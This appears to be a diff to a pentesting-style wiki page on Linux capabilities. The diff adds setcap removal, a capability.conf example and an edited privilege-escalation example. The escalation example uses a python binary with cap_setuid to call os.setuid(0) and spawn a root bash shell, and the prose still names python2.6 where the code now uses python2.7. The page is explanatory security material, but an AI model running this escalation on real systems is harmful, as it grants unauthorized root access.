@@ -150,6 +150,34 @@ Besides the output of _capsh_ itself, the _tcpdump_ command itself should also r
 
 The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.
 
+### Remove Capabilities
+
+You can remove capabilities of a binary with
+
+```bash
+setcap -r </path/to/binary>
+```
+
+## User Capabilities
+
+Apparently **it's possible to assign capabilities also to users**. This probably means that every process executed by the user will be able to use the users capabilities.  
+Base on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user will be `/etc/security/capability.conf`.  
+File example:
+
+```bash
+# Simple
+cap_sys_ptrace               developer
+cap_net_raw                  user1
+
+# Multiple capablities
+cap_net_admin,cap_net_raw    jrnetadmin
+# Identical, but with numeric values
+12,13                        jrnetadmin
+
+# Combining names and numerics
+cap_sys_admin,22,25          jrsysadmin
+```
+
 ## Malicious Use
 
 Capabilities are useful when you **want to restrict your own processes after performing privileged operations** \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root.
@@ -178,11 +206,11 @@ getcap -r / 2>/dev/null
 In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:
 
 ```bash
-getcap -r / 2>/dev/null
-/usr/bin/python2.6 = cap_setuid+ep
+setcap cap_setuid+ep /usr/bin/python2.7
+/usr/bin/python2.7 = cap_setuid+ep
 
 #Exploit
-/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash");'
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
 
 **Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:
